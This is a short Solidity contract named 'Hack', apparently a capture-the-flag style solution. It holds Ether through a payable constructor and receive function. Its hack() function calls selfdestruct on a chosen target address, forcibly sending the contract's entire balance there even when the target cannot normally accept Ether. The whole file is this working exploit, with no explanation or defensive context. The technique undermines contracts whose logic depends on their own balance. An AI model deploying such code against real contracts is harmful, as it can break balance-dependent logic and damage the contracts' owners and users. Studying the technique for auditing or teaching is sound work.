// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    constructor() payable {}


    receive() external payable {}

    function hack(address payable target) public {
        selfdestruct(target);
    }
}
